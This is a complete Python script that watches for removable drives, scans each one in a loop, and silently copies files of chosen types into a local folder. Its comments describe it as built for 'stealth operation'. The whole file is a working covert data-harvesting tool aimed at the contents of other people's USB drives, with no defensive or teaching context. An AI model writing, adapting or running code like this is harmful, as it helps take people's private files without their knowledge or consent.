import os
import psutil
import time
import shutil
import logging

# Set up logging for stealth operation
logging.basicConfig(filename='file_copy_log.txt', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def get_removable_drives():
    drives = []
    for partition in psutil.disk_partitions():
        if 'removable' in partition.opts:
            drives.append(partition.mountpoint)
    return drives

def find_and_copy_files(drive, file_types, destination):
    for root, dirs, files in os.walk(drive):
        for file in files:
            if any(file.lower().endswith(ext) for ext in file_types):
                file_path = os.path.join(root, file)
                dest_path = os.path.join(destination, os.path.basename(file))
                
                # Copy if not already present or if a newer version exists
                if not os.path.exists(dest_path) or os.path.getmtime(file_path) > os.path.getmtime(dest_path):
                    try:
                        shutil.copy(file_path, dest_path)
                        logging.info(f"File '{file}' copied to {destination}")
                    except Exception as e:
                        logging.error(f"Error copying '{file_path}': {e}")

def main():
    # Collect and validate inputs silently
    file_types = input("Enter file types to search for (e.g., .txt, .jpg, comma-separated): ").split(',')
    file_types = [ft.strip().lower() for ft in file_types if ft.strip().startswith('.')]
    
    destination = input("Enter the destination folder path: ").strip()
    if not os.path.exists(destination):
        logging.error(f"The destination folder '{destination}' does not exist.")
        return
    
    # Scanning interval
    try:
        interval = int(input("Enter the scanning interval in seconds (default is 2): ").strip())
    except ValueError:
        interval = 2  # Default

    # Start scanning loop silently
    try:
        while True:
            removable_drives = get_removable_drives()
            for drive in removable_drives:
                find_and_copy_files(drive, file_types, destination)
            time.sleep(interval)
    except KeyboardInterrupt:
        logging.info("Scanning stopped by user.")

if __name__ == "__main__":
    main()
